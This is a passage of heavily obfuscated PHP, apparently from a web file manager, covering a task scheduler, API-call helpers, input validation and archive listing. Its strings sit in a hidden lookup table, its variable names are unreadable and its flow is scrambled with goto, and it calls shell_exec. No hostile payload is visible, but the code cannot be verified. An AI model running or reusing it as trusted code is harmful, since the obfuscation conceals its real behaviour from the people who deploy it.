$EÛÅî¯Ã‹ =& $_SERVER[Äº¡•ô™Ÿ]; self::valueSet($EÛÅî¯Ã‹[1380], $EÛÅî¯Ã‹[464]); self::log($EÛÅî¯Ã‹[1386]); } public static function config($cîƒ’œŸ…†, $dÊª†›Ìš ) { $e„ƒ‚î´ï† =& $_SERVER[Äº¡•ô™Ÿ]; $DÇ·‹Ì£†Ä = 20; $dÊª†›Ìš  = intval($dÊª†›Ìš ) <= $DÇ·‹Ì£†Ä ? $DÇ·‹Ì£†Ä : intval($dÊª†›Ìš ); self::valueSet($e„ƒ‚î´ï†[692], $cîƒ’œŸ…†); self::valueSet($e„ƒ‚î´ï†[1385], $dÊª†›Ìš ); } private static function taskRunAll() { $Eß¶“¶óÀÃ =& $_SERVER[Äº¡•ô™Ÿ]; $fªÎŒÏ…à = Model($Eß¶“¶óÀÃ[1387])->listData(); $cœê‡Ãó = count($fªÎŒÏ…à); for ($CÚÕ­„öÊ = 0; $CÚÕ­„öÊ < $cœê‡Ãó; $CÚÕ­„öÊ++) { $a‚‰ĞÕã‡Ë = $fªÎŒÏ…à[$CÚÕ­„öÊ]; if ($a‚‰ĞÕã‡Ë[$Eß¶“¶óÀÃ[1388]] != $Eß¶“¶óÀÃ[83]) { continue; } if (!self::taskTimeCheck($a‚‰ĞÕã‡Ë)) { continue; } self::taskRun($a‚‰ĞÕã‡Ë); } Hook::trigger($Eß¶“¶óÀÃ[1389]); } private static function taskTimeCheck($a…•ÈÅ‘Ö) { goto a¢¢£àˆàÕ; E¨¯èßšËÕ: $fæïœ¯÷› = strtotime($BÅÜÔÕ“©Å[1390] . $AÁ‡Ô¶„Ò[$BÅÜÔÕ“©Å[1391]] . $BÅÜÔÕ“©Å[1392]) - strtotime($BÅÜÔÕ“©Å[1393]); $D´™®é˜±¶ = time() - strtotime(date($BÅÜÔÕ“©Å[1394]) . $BÅÜÔÕ“©Å[1395]); $aïßÓ´¦‹– = $D´™®é˜±¶ >= $fæïœ¯÷› && $D´™®é˜±¶ <= $fæïœ¯÷› + 3600; goto E–˜‡àƒö; E–˜‡àƒö: switch ($AÁ‡Ô¶„Ò[$BÅÜÔÕ“©Å[29]]) { case $BÅÜÔÕ“©Å[1396]: if (time() - $c«ŠÎÀ­”á < 3600 * 24 * 30) { return !1; } if ($AÁ‡Ô¶„Ò[$BÅÜÔÕ“©Å[1396]] == date($BÅÜÔÕ“©Å[1397]) && $aïßÓ´¦‹–) { return !0; } break; case $BÅÜÔÕ“©Å[1398]: if (time() - $c«ŠÎÀ­”á < 3600 * 24 * 7) { return !1; } $a¹¾¨õ÷İ› = date($BÅÜÔÕ“©Å[1399]) == 0 ? 7 : date($BÅÜÔÕ“©Å[1399]); if ($AÁ‡Ô¶„Ò[$BÅÜÔÕ“©Å[1398]] == $a¹¾¨õ÷İ› && $aïßÓ´¦‹–) { return !0; } break; case $BÅÜÔÕ“©Å[1391]: if (time() - $c«ŠÎÀ­”á < 3600 * 24) { return !1; } if ($aïßÓ´¦‹–) { return !0; } break; case $BÅÜÔÕ“©Å[1400]: if (time() - $c«ŠÎÀ­”á >= floatval($AÁ‡Ô¶„Ò[$BÅÜÔÕ“©Å[1400]]) * 60) { return !0; } break; default: break; } return !1; goto FÙ…æù¢Í‚; a¢¢£àˆàÕ: $BÅÜÔÕ“©Å =& $_SERVER[Äº¡•ô™Ÿ]; $AÁ‡Ô¶„Ò = json_decode($a…•ÈÅ‘Ö[$BÅÜÔÕ“©Å[187]], !0); $c«ŠÎÀ­”á = intval($a…•ÈÅ‘Ö[$BÅÜÔÕ“©Å[1381]]); goto E¨¯èßšËÕ; FÙ…æù¢Í‚: } public static function taskRun($b™Á†˜ÃÛ¬) { goto BÑƒ¸•Û ; e‚æÜº¯™•: $EëÛÑìƒ“Ë = timeFloat(); $f–ÙŠÇÃ•‹ = $a‘¢½ÅÙ«¥[33]; switch ($b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[29]]) { case $a‘¢½ÅÙ«¥[292]: $fµÀÅÖ‘í¦ = url_request($b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[1404]], $a‘¢½ÅÙ«¥[213], !1, !1, !1, !1, 5); $f–ÙŠÇÃ•‹ = strlen($fµÀÅÖ‘í¦); break; case $a‘¢½ÅÙ«¥[212]: $f–ÙŠÇÃ•‹ = Hook::apply($b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[1404]]); default: break; } goto EŞÚŠèÎ¿Â; EŞÚŠèÎ¿Â: Model($a‘¢½ÅÙ«¥[1405])->add(array($a‘¢½ÅÙ«¥[1406] => $a‘¢½ÅÙ«¥[33], $a‘¢½ÅÙ«¥[1407] => $a‘¢½ÅÙ«¥[464], $a‘¢½ÅÙ«¥[29] => $a‘¢½ÅÙ«¥[1408] . $b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[364]], $a‘¢½ÅÙ«¥[1409] => json_encode(array($a‘¢½ÅÙ«¥[28] => $b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[28]], $a‘¢½ÅÙ«¥[1410] => timeFloat() - $EëÛÑìƒ“Ë, $a‘¢½ÅÙ«¥[278] => $f–ÙŠÇÃ•‹)))); self::log($a‘¢½ÅÙ«¥[1411] . $b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[364]] . $a‘¢½ÅÙ«¥[1412] . $f–ÙŠÇÃ•‹); return !0; goto c­øì³ãÕä; BÑƒ¸•Û : $a‘¢½ÅÙ«¥ =& $_SERVER[Äº¡•ô™Ÿ]; self::log($a‘¢½ÅÙ«¥[1401] . $b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[364]] . $a‘¢½ÅÙ«¥[1402] . $b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[28]] . $a‘¢½ÅÙ«¥[1403] . $b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[1404]]); Model($a‘¢½ÅÙ«¥[1387])->run($b™Á†˜ÃÛ¬[$a‘¢½ÅÙ«¥[364]]); goto e‚æÜº¯™•; c­øì³ãÕä: } private static function valueGet($BºœÃéôêÁ) { $e°…’á½• =& $_SERVER[Äº¡•ô™Ÿ]; $Eöïº…Ç±… = $e°…’á½•[1413]; $A½»½äÁ—Ã = Model($e°…’á½•[1414])->get($BºœÃéôêÁ, $Eöïº…Ç±…); if (is_null($A½»½äÁ—Ã)) { Model($e°…’á½•[1414])->set($e°…’á½•[1385], 10, $Eöïº…Ç±…); Model($e°…’á½•[1414])->set($e°…’á½•[692], $e°…’á½•[83], $Eöïº…Ç±…); Model($e°…’á½•[1414])->set($e°…’á½•[1380], $e°…’á½•[464], $Eöïº…Ç±…); $A½»½äÁ—Ã = Model($e°…’á½•[1414])->get($BºœÃéôêÁ, $Eöïº…Ç±…); } return $A½»½äÁ—Ã; } private static function valueSet($Aô¾ºã¸è, $Cí¹İéßŠØ) { $BŒ˜õóŞÆÙ =& $_SERVER[Äº¡•ô™Ÿ]; return Model($BŒ˜õóŞÆÙ[1414])->set($Aô¾ºã¸è, $Cí¹İéßŠØ, $BŒ˜õóŞÆÙ[1413]); } protected static function log($bœ‘‡Å‘¤Š) { write_log($bœ‘‡Å‘¤Š, $_SERVER[Äº¡•ô™Ÿ][1415]); } private static function cacheClear() { $A®¹Ş÷Æ†— =& $_SERVER[Äº¡•ô™Ÿ]; $cæÄ±Ù¤Ì = Model($A®¹Ş÷Æ†—[1414])->cacheKey($A®¹Ş÷Æ†—[1413]); Cache::clearMemory($cæÄ±Ù¤Ì); } } goto AªË‚çò÷; e¹—”ÈÄ: function ActionCall($D¶Á©ƒÉº) { $CÖ ÉåáÑƒ = array_slice(func_get_args(), 1); return ActionApply($D¶Á©ƒÉº, $CÖ ÉåáÑƒ); } function ActionCallApi($FËõïà¥Œ¢, $Bñ”ÑŠô÷à = '') { goto Fˆ¨ò©®­; cŠÏÌŞÏãê: return $Fâù³”õÖ; goto E¢Ÿ¿ºïà; d¡„ÔÑÆ‚¿: $fÛå·àí•“ = Action($FÊªÄÂ…æ›[23])->accessToken(); $FËõïà¥Œ¢ = str_replace($FÊªÄÂ…æ›[5], $FÊªÄÂ…æ›[4], $FËõïà¥Œ¢) . $FÊªÄÂ…æ›[24] . $fÛå·àí•“ . $EÑ¦ï¡„é; $d ÷É˜ßº¼ = $FÊªÄÂ…æ›[20]; goto EÅËÙÌ›Ğ; Fˆ¨ò©®­: $FÊªÄÂ…æ› =& $_SERVER[•Éº±‡£‰èä]; $EÑ¦ï¡„é = $Bñ”ÑŠô÷à; if (is_array($Bñ”ÑŠô÷à)) { $EÑ¦ï¡„é = $FÊªÄÂ…æ›[20]; foreach ($Bñ”ÑŠô÷à as $BÏ£¨»£ëá => $eí•¡”äÏ) { $eí•¡”äÏ = is_array($eí•¡”äÏ) ? json_encode($eí•¡”äÏ) : $eí•¡”äÏ; $eí•¡”äÏ = is_bool($eí•¡”äÏ) ? intval($eí•¡”äÏ) : $eí•¡”äÏ; $EÑ¦ï¡„é .= $FÊªÄÂ…æ›[21] . $BÏ£¨»£ëá . $FÊªÄÂ…æ›[22] . rawurlencode($eí•¡”äÏ); } } goto d¡„ÔÑÆ‚¿; C®«ÎÖ³: $cæÆä‡ Ã = json_decode($d ÷É˜ßº¼, !0); $Fâù³”õÖ = is_array($cæÆä‡ Ã) ? $cæÆä‡ Ã : array($FÊªÄÂ…æ›[33] => null, $FÊªÄÂ…æ›[34] => $d ÷É˜ßº¼); if (!$cæÆä‡ Ã) { echo $d ÷É˜ßº¼; } goto cŠÏÌŞÏãê; EÅËÙÌ›Ğ: $eË°™ãˆÛõ = phpBinCommand(); if ($eË°™ãˆÛõ && function_exists($FÊªÄÂ…æ›[25])) { $AŸœÜˆÊß = $eË°™ãˆÛõ . $FÊªÄÂ…æ›[26] . BASIC_PATH . $FÊªÄÂ…æ›[27] . escapeshellarg($FËõïà¥Œ¢); $d ÷É˜ßº¼ = shell_exec($AŸœÜˆÊß); } if (!$d ÷É˜ßº¼) { $c¥Ã…Ÿø = stream_context_create(array($FÊªÄÂ…æ›[28] => array($FÊªÄÂ…æ›[29] => 20, $FÊªÄÂ…æ›[30] => $FÊªÄÂ…æ›[31]))); $d ÷É˜ßº¼ = file_get_contents(APP_HOST . $FÊªÄÂ…æ›[32] . $FËõïà¥Œ¢, !1, $c¥Ã…Ÿø); } goto C®«ÎÖ³; E¢Ÿ¿ºïà: } function ActionCallHook($A‘¦—ß°âÑ) { goto C•àÁ¸ïƒº; DÌçÉ¼«éÎ: $eäİ–ê¯¥Ã = $aåÃØ®ŠŠø ? json_decode($aåÃØ®ŠŠø, !0) : $eäİ–ê¯¥Ã; $GLOBALS[$DÏ¶Šµ“Í²[35]] = 0; return $eäİ–ê¯¥Ã; goto aÔõ¯ßäÑ¤; C•àÁ¸ïƒº: $DÏ¶Šµ“Í² =& $_SERVER[•Éº±‡£‰èä]; ob_start(); $BÊ’À’½‰Ş = array_slice(func_get_args(), 1); goto BŠ¬×Œ‚²Æ; BŠ¬×Œ‚²Æ: $GLOBALS[$DÏ¶Šµ“Í²[35]] = 1; $eäİ–ê¯¥Ã = ActionApply($A‘¦—ß°âÑ, $BÊ’À’½‰Ş); $aåÃØ®ŠŠø = ob_get_clean(); goto DÌçÉ¼«éÎ; aÔõ¯ßäÑ¤: } goto b ßÆàà¿; E³‡öà®Ú: class Input { public static function getArray($CÃê¼’º…×) { goto fß§£Ã¿„–; fß§£Ã¿„–: $eêÁ¸é =& $_SERVER[Äº¡•ô™Ÿ]; global $in; $döí¸‰­¹½ = array(); goto A¶À«İ”Š; f·çĞª·„Î: if (count($Cô‹ø…‚è) > 0) { show_json(implode($eêÁ¸é[1856], $Cô‹ø…‚è), !1); } return $döí¸‰­¹½; goto F¹Œ¼òöõÉ; A¶À«İ”Š: $Cô‹ø…‚è = array(); $c“¾ÀìÆ‰œ = LNG($eêÁ¸é[1852]); foreach ($CÃê¼’º…× as $eÍ¾‰®©ƒ– => $câÑŞÏÓ­) { goto dÕš»à»’Œ; dÕš»à»’Œ: $e¥Ïèôğ«† = _get($câÑŞÏÓ­, $eêÁ¸é[1240], $c“¾ÀìÆ‰œ . $eêÁ¸é[882] . $eÍ¾‰®©ƒ–); $A©ßê¸ÀÚ¸ = $eÍ¾‰®©ƒ–; if (isset($câÑŞÏÓ­[$eêÁ¸é[1853]]) && $câÑŞÏÓ­[$eêÁ¸é[1853]]) { $A©ßê¸ÀÚ¸ = $câÑŞÏÓ­[$eêÁ¸é[1853]]; } goto fí«¾¸ŠïÖ; A®‰ÊçÍÎÇ: if (isset($câÑŞÏÓ­[$eêÁ¸é[1855]]) && !self::check($in[$eÍ¾‰®©ƒ–], $câÑŞÏÓ­[$eêÁ¸é[1855]], $f¨¼‘ù»À)) { if (array_key_exists($eêÁ¸é[1854], $câÑŞÏÓ­)) { if (!is_null($câÑŞÏÓ­[$eêÁ¸é[1854]])) { $döí¸‰­¹½[$A©ßê¸ÀÚ¸] = $câÑŞÏÓ­[$eêÁ¸é[1854]]; } } else { $Cô‹ø…‚è[] = $e¥Ïèôğ«†; } continue; } $döí¸‰­¹½[$A©ßê¸ÀÚ¸] = $in[$eÍ¾‰®©ƒ–]; goto aÉ»¦×Š¼‘; fí«¾¸ŠïÖ: if (!array_key_exists($eÍ¾‰®©ƒ–, $in)) { if (array_key_exists($eêÁ¸é[1854], $câÑŞÏÓ­)) { if (!is_null($câÑŞÏÓ­[$eêÁ¸é[1854]])) { $döí¸‰­¹½[$A©ßê¸ÀÚ¸] = $câÑŞÏÓ­[$eêÁ¸é[1854]]; } } else { if (isset($câÑŞÏÓ­[$eêÁ¸é[1855]])) { $Cô‹ø…‚è[] = $e¥Ïèôğ«†; } } continue; } if (isset($câÑŞÏÓ­[$eêÁ¸é[1855]]) && $câÑŞÏÓ­[$eêÁ¸é[1855]] == $eêÁ¸é[279]) { $fĞÍ©äèèİ = json_decode($in[$eÍ¾‰®©ƒ–], !0); if (is_array($fĞÍ©äèèİ)) { $döí¸‰­¹½[$A©ßê¸ÀÚ¸] = $fĞÍ©äèèİ; } else { if (array_key_exists($eêÁ¸é[1854], $câÑŞÏÓ­)) { if (!is_null($câÑŞÏÓ­[$eêÁ¸é[1854]])) { $döí¸‰­¹½[$A©ßê¸ÀÚ¸] = $câÑŞÏÓ­[$eêÁ¸é[1854]]; } } else { $Cô‹ø…‚è[] = $e¥Ïèôğ«†; } } continue; } $f¨¼‘ù»À = _get($câÑŞÏÓ­, $eêÁ¸é[1011]); goto A®‰ÊçÍÎÇ; aÉ»¦×Š¼‘: } goto f·çĞª·„Î; F¹Œ¼òöõÉ: } public static function reg($E ÎÜéŞØÊ = "\162\x65\161\x75\x69\x72\145") { static $e˜›¨óÌÕø = array("\162\x65\x71\165\151\162\x65" => "\x2e\53", "\156\x75\155\142\145\162" => "\x5c\144\53", "\x68\x65\x78" => "\x5b\x30\55\x39\101\55\106\141\x2d\146\135\x2b", "\x69\x6e\164" => "\x5b\55\x5c\53\135\77\134\x64\53", "\x62\157\157\154" => "\60\174\61", "\146\x6c\x6f\141\164" => "\x5b\x2d\134\53\135\77\x5c\x64\x2b\50\x5c\x2e\134\x64\x2b\51\x3f", "\x65\156\x67\154\x69\x73\150" => "\133\101\55\x5a\x61\x2d\x7a\40\x5d\53", "\x63\x68\x69\x6e\x65\x73\145" => "\133\134\170\x7b\x34\x65\x30\60\x7d\55\x5c\x78\173\71\146\141\65\x7d\135\x2b", "\150\x61\163\103\150\x69\x6e\145\163\145" => "\57\x28\x5b\134\170\173\64\145\x30\60\x7d\55\x5c\x78\x7b\x39\146\141\65\175\135\53\51\57\165", "\x65\155\141\151\x6c" => "\134\167\53\50\133\134\x2e\x5c\55\135\134\167\x2b\51\x2a\x5c\x40\134\x77\x2b\x28\x5b\134\56\x5c\x2d\x5d\x5c\x77\x2b\51\52\134\x2e\x5c\x77\53", "\160\150\157\156\x65" => "\61\x5b\x33\55\x39\135\134\x64\x7b\x39\175", "\164\145\x6c\x70\x68\x6f\156\x65" => "\50\x5c\50\134\x64\x7b\x33\54\64\175\x5c\x29\174\x5c\x64\173\x33\54\64\175\x2d\x7c\x5c\x73\51\x3f\134\144\x7b\x37\x2c\61\64\175", "\165\x72\154" => "\x28\x68\x74\x74\x70\x7c\x66\164\160\x7c\x68\164\x74\160\x73\51\x3a\134\57\134\57\133\x5c\x77\134\x2d\137\135\x2b\x28\134\x2e\133\134\x77\134\55\x5f\135\x2b\x29\53\50\x5b\x5c\x77\x5c\55\x5c\x2e\x2c\x40\77\136\x3d\45\x26\72\x5c\x2f\176\x5c\53\x23\135\x2a\133\x5c\167\x5c\55\134\x40\77\x5e\x3d\45\x26\134\x2f\176\134\53\43\135\x29\x3f", "\x75\x72\x6c\x46\x75\154\x6c" => "\133\x61\x2d\172\x41\x2d\172\135\53\x3a\x5c\x2f\134\57\x5b\x5e\x5c\x73\x5d\52", "\x69\160" => "\x28\x5c\144\173\x31\54\63\x7d\134\x2e\x29\x7b\x33\x7d\50\x5c\x64\x7b\61\x2c\63\175\x29", "\x7a\x69\x70" => "\x5b\61\x2d\x39\x5d\134\x64\173\x35\175\50\77\x21\134\x64\x29", "\x69\144\x43\141\x72\144" => "\x28\x5c\144\173\61\x35\x7d\51\x7c\x28\x5c\x64\173\61\67\175\50\x5c\144\x7c\130\x7c\x78\x29\x29", "\143\x6f\x6c\157\162" => "\43\x28\133\x30\55\71\101\x2d\x46\141\x2d\x66\x5d\173\63\175\174\133\60\x2d\71\x41\55\106\141\x2d\x66\x5d\x7b\66\175\x29", "\164\151\155\145" => "\50\x5b\60\x2d\x31\x5d\x5c\x64\174\62\133\x30\x2d\64\x5d\51\x3a\x5b\60\55\65\135\134\x64", "\x64\x61\164\x65" => "\134\x64\173\64\175\x5b\x2d\134\x2f\135\77\50\60\133\61\55\71\135\174\61\x5b\x30\55\x32\135\51\133\55\x5c\57\x5d\x3f\50\133\60\55\62\x5d\134\144\174\x33\x5b\x30\55\61\x5d\51", "\x64\141\x74\x65\x54\x69\155\145" => "\134\144\173\x34\x7d\x5b\55\134\x2f\x5d\77\50\x30\x5b\61\55\x39\135\174\61\x5b\60\x2d\x32\x5d\51\x5b\55\134\57\x5d\x3f\x28\x5b\60\55\62\135\x5c\x64\x7c\x33\133\60\55\x31\x5d\x29\x5c\163\53\x28\133\x30\x2d\61\135\134\144\x7c\62\133\60\55\x34\x5d\51\x3a\133\x30\x2d\65\x5d\x5c\x64", "\160\x61\163\163\x77\157\x72\x64" => "\x28\x3f\75\x2e\52\134\144\x29\x28\77\x3d\56\52\133\x61\x2d\x7a\x5d\x29\50\x3f\x3d\x2e\x2a\133\101\x2d\132\135\x29\x2e\173\x38\54\x32\60\175", "\153\145\x79" => "\x5b\x41\55\132\x61\55\172\60\55\71\137\x5c\55\x5c\x2e\135\53", "\153\145\171\106\165\x6c\154" => "\x5b\x41\55\x5a\141\55\x7a\x30\55\x39\137\134\x2d\134\x2e\x5c\x73\54\135\53"); if (!$E ÎÜéŞØÊ) { return $e˜›¨óÌÕø; } return $e˜›¨óÌÕø[$E ÎÜéŞØÊ]; } public static function check($FĞ§±ë—Şß, $CëâÕ”´Ù›, $C²¾öºé¡’ = null) { $EÄ«¹óÌÔÈ =& $_SERVER[Äº¡•ô™Ÿ]; switch ($CëâÕ”´Ù›) { case $EÄ«¹óÌÔÈ[7]: return in_array($FĞ§±ë—Şß, $C²¾öºé¡’); break; case $EÄ«¹óÌÔÈ[1857]: return floatval($FĞ§±ë—Şß) > $C²¾öºé¡’; break; case $EÄ«¹óÌÔÈ[1858]: return floatval($FĞ§±ë—Şß) < $C²¾öºé¡’; break; case $EÄ«¹óÌÔÈ[322]: return strlen($FĞ§±ë—Şß) >= $C²¾öºé¡’[0] && strlen($FĞ§±ë—Şß) <= $C²¾öºé¡’[1]; break; case $EÄ«¹óÌÔÈ[322]: if (is_array($C²¾öºé¡’)) { return strlen($FĞ§±ë—Şß) >= $C²¾öºé¡’[0] && strlen($FĞ§±ë—Şß) <= $C²¾öºé¡’[1]; break; } else { return strlen($FĞ§±ë—Şß) == $C²¾öºé¡’; break; } case $EÄ«¹óÌÔÈ[318]: return floatval($FĞ§±ë—Şß) >= $C²¾öºé¡’[0] && floatval($FĞ§±ë—Şß) <= $C²¾öºé¡’[1]; break; } $cÍÒóËî— = self::reg(!1); $CëâÕ”´Ù› = isset($cÍÒóËî—[$CëâÕ”´Ù›]) ? $cÍÒóËî—[$CëâÕ”´Ù›] : $CëâÕ”´Ù›; if (substr($CëâÕ”´Ù›, 0, 1) != $EÄ«¹óÌÔÈ[8]) { $CëâÕ”´Ù› = $EÄ«¹óÌÔÈ[1859] . $CëâÕ”´Ù› . $EÄ«¹óÌÔÈ[1860]; } return preg_match($CëâÕ”´Ù›, $FĞ§±ë—Şß) === 1; } public static function get($bÆ¹Ÿ‘­Ø, $b«ã‘—ãî = null, $cç™§î Š = null, $CàÁÎÒÀ¾ò = null) { goto Bõ¬„»ë; Bõ¬„»ë: $e¹¬‰Ú•½õ =& $_SERVER[Äº¡•ô™Ÿ]; $C·³÷ìì¹ = array(); if (!is_null($cç™§î Š)) { $C·³÷ìì¹[$e¹¬‰Ú•½õ[34]] = $cç™§î Š; } goto cËÕ¢åÅçœ; aÓä×‘®Õ©: return $a„‹İÕ¨ÏÄ[$bÆ¹Ÿ‘­Ø]; goto fÇÃ•Ôôğâ; cËÕ¢åÅçœ: if (!is_null($CàÁÎÒÀ¾ò)) { $C·³÷ìì¹[$e¹¬‰Ú•½õ[1011]] = $CàÁÎÒÀ¾ò; } if (!is_null($b«ã‘—ãî)) { $C·³÷ìì¹[$e¹¬‰Ú•½õ[1855]] = $b«ã‘—ãî; } $a„‹İÕ¨ÏÄ = Input::getArray(array($bÆ¹Ÿ‘­Ø => $C·³÷ìì¹)); goto aÓä×‘®Õ©; fÇÃ•Ôôğâ: } } class KodArchive { static function init() { goto d‰‘‡„Æ‘†; c˜´Ú×‡: require_once ARCHIVE_LIB . $DÒ†ºÍèÅ[1872]; goto e°‘šæ¬§è; açö¶ïÒœ”: require_once ARCHIVE_LIB . $DÒ†ºÍèÅ[1869]; require_once ARCHIVE_LIB . $DÒ†ºÍèÅ[1870]; require_once ARCHIVE_LIB . $DÒ†ºÍèÅ[1871]; goto c˜´Ú×‡; d‰‘‡„Æ‘†: $DÒ†ºÍèÅ =& $_SERVER[Äº¡•ô™Ÿ]; if (defined($DÒ†ºÍèÅ[1861])) { return; } define($DÒ†ºÍèÅ[1861], SDK_DIR . $DÒ†ºÍèÅ[1862]); goto bå›â„©Ñ; bå›â„©Ñ: define($DÒ†ºÍèÅ[1863], TEMP_FILES); define($DÒ†ºÍèÅ[1864], TEMP_FILES); define($DÒ†ºÍèÅ[1865], $DÒ†ºÍèÅ[1866]); goto FöÈÙİò®Ë; FöÈÙİò®Ë: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $DÒ†ºÍèÅ[1867]; require_once ARCHIVE_LIB . $DÒ†ºÍèÅ[1868]; goto açö¶ïÒœ”; e°‘šæ¬§è: } static function checkIfType($C–áŒ«³Âİ, $e“äµğÌã) { goto E÷Ü´ß‰„›; fì‰í²ÚÒİ: $A¤±­½‹è = in_array($C–áŒ«³Âİ, $eœ‰ ³”Ñ¨[$e“äµğÌã]); if ($A¤±­½‹è && ($e“äµğÌã == $F©øÕêÆ[298] || $e“äµğÌã == $F©øÕêÆ[1876]) && (!function_exists($F©øÕêÆ[1884]) || !function_exists($F©øÕêÆ[1885]))) { show_tips($F©øÕêÆ[1886]); } if ($A¤±­½‹è && $e“äµğÌã == $F©øÕêÆ[1045] && (!function_exists($F©øÕêÆ[1887]) || !strstr(shell_exec($F©øÕêÆ[1888]), $F©øÕêÆ[1889]))) { show_tips($F©øÕêÆ[1890]); } goto Aæ¢ˆ³Ï©Ü; E÷Ü´ß‰„›: $F©øÕêÆ =& $_SERVER[Äº¡•ô™Ÿ]; self::init(); $eœ‰ ³”Ñ¨ = array($F©øÕêÆ[298] => array($F©øÕêÆ[298], $F©øÕêÆ[1873], $F©øÕêÆ[1874], $F©øÕêÆ[1875]), $F©øÕêÆ[1876] => array($F©øÕêÆ[1876], $F©øÕêÆ[1877], $F©øÕêÆ[1043], $F©øÕêÆ[1041]), $F©øÕêÆ[1045] => array($F©øÕêÆ[1045], $F©øÕêÆ[1878], $F©øÕêÆ[1879], $F©øÕêÆ[1880], $F©øÕêÆ[1881], $F©øÕêÆ[1882], $F©øÕêÆ[1883])); goto fì‰í²ÚÒİ; Aæ¢ˆ³Ï©Ü: return $A¤±­½‹è; goto D’‰ñğâ»; D’‰ñğâ»: } static function listContent($F¯¤½Ş•ç, $cÉŒ•Ö»îò = true) { $E“ˆõ’îøÃ =& $_SERVER[Äº¡•ô™Ÿ]; self::init(); $AÛÊÂ¿˜’æ = !empty($GLOBALS[$E“ˆõ’îøÃ[1049]]) ? $GLOBALS[$E“ˆõ’îøÃ[1049]] : get_path_ext($F¯¤½Ş•ç); $cœƒ³¾¹ÕÇ = !1; if (self::checkIfType($AÛÊÂ¿˜’æ, $E“ˆõ’îøÃ[1876])) { $A¾ä¿”ÅÃù = PclTarList($F¯¤½Ş•ç, $AÛÊÂ¿˜’æ); $cœƒ³¾¹ÕÇ = array(); for ($B¶¡¬ñ´Ëˆ = 0; $B¶¡¬ñ´Ëˆ < count($A¾ä¿”ÅÃù); $B¶¡¬ñ´Ëˆ++) { $B™ÅÈ…Ã‡¥ = $A¾ä¿”ÅÃù[$B¶¡¬ñ´Ëˆ]; if ($B™ÅÈ…Ã‡¥[$E“ˆõ’îøÃ[1891]] == $E“ˆõ’îøÃ[1892] || $B™ÅÈ…Ã‡¥[$E“ˆõ’îøÃ[1891]] == $E“ˆõ’îøÃ[1893]) { continue; } if ($cÉŒ•Ö»îò) { $B™ÅÈ…Ã‡¥[$E“ˆõ’îøÃ[1894]] = ltrim($B™ÅÈ…Ã‡¥[$E“ˆõ’îøÃ[1894]], $E“ˆõ’îøÃ[1147]); } if ($B™ÅÈ…Ã‡¥[$E“ˆõ’îøÃ[1891]] == $E“ˆõ’îøÃ[1895]) { $B™ÅÈ…Ã‡¥[$E“ˆõ’îøÃ[76]] = !0; } else { $B™ÅÈ…Ã‡¥[$E“ˆõ’îøÃ[76]] = !1; } $B™ÅÈ…Ã‡¥[$E“ˆõ’îøÃ[1036]] = $B¶¡¬ñ´Ëˆ; $cœƒ³¾¹ÕÇ[] = $B™ÅÈ…Ã‡¥; } } else { if (self::checkIfType($AÛÊÂ¿˜’æ, $E“ˆõ’îøÃ[1045])) { $eŞÌ¾õ¸ù‡ = kodRarArchive::listContent($F¯¤½Ş•ç); if (!$eŞÌ¾õ¸ù‡[$E“ˆõ’îøÃ[1032]]) { return $eŞÌ¾õ¸ù‡; } else { $cœƒ³¾¹ÕÇ = $eŞÌ¾õ¸ù‡[$E“ˆõ’îøÃ[1034]]; } } else { if (kodZipArchive::support($E“ˆõ’îøÃ[351])) { $cœƒ³¾¹ÕÇ = kodZipArchive::listContent($F¯¤½Ş•ç); } else { $a‰È¯³„­‡ = new PclZip($F¯¤½Ş•ç); $cœƒ³¾¹ÕÇ = $a‰È¯³„­‡->listContent(); } } } if ($cœƒ³¾¹ÕÇ) { $FõˆñÀÓ´ğ = unzip_charset_get($cœƒ³¾¹ÕÇ); $cÉŒ•Ö»îò = $cÉŒ•Ö»îò && function_exists($E“ˆõ’îøÃ[65]); for ($B¶¡¬ñ´Ëˆ = 0; $B¶¡¬ñ´Ëˆ < count($cœƒ³¾¹ÕÇ); $B¶¡¬ñ´Ëˆ++) { $cœƒ³¾¹ÕÇ[$B¶¡¬ñ´Ëˆ][$E“ˆõ’îøÃ[1894]] = str_replace(array($E“ˆõ’îøÃ[1072], $E“ˆõ’îøÃ[1896]), $E“ˆõ’îøÃ[765], $cœƒ³¾¹ÕÇ[$B¶¡¬ñ´Ëˆ][$E“ˆõ’îøÃ[1894]]); if ($cÉŒ•Ö»îò) { $cœƒ³¾¹ÕÇ[$B¶¡¬ñ´Ëˆ][$E“ˆõ’îøÃ[1894]] = iconv_to($cœƒ³¾¹ÕÇ[$B¶¡¬ñ´Ëˆ][$E“ˆõ’îøÃ[1894]], $FõˆñÀÓ´ğ, $E“ˆõ’îøÃ[323]); unset($cœƒ³¾¹ÕÇ[$B¶¡¬ñ´Ëˆ][$E“ˆõ’îøÃ[1897]]); } } return array($E“ˆõ’îøÃ[1032] => !0, $E“ˆõ’îøÃ[1034] => $cœƒ³¾¹ÕÇ); } else { return array($E“ˆõ’îøÃ[1032] => !1, $E“ˆõ’îøÃ[1034] => $cœƒ³¾¹ÕÇ); } } static function extract($fÙ¹Åƒó¶Û, $b…ŠŸ‹™±Ñ, $Có³Î¬Üé¡ = "\55\x31", &$FíÊî­¸éë = false) { goto c¬À†”ÌÉß; D¥‡›ø’Ø: $e—‘Ïì°¸ğ = self::listContent($fÙ¹Åƒó¶Û, !1); if (!$e—‘Ïì°¸ğ[$A„ÂàĞî•¸[1032]]) { return $e—‘Ïì°¸ğ; } if ($Có³Î¬Üé¡ != $A„ÂàĞî•¸[1031]) { goto BºÙ¡²÷Ø; BÏÈôƒğÌ: if ($dÙ»ã‚«ÁŒ[$A„ÂàĞî•¸[76]]) { $E‰„÷Ö÷è¡ = rtrim($E‰„÷Ö÷è¡, $A„ÂàĞî•¸[8]) . $A„ÂàĞî•¸[8]; $FíÊî­¸éë = array($FíÊî­¸éë); } $E¬ŒÍÑª = str_replace($A„ÂàĞî•¸[95], $A„ÂàĞî•¸[8], $E‰„÷Ö÷è¡); if (substr($E¬ŒÍÑª, -1) == $A„ÂàĞî•¸[8]) { if 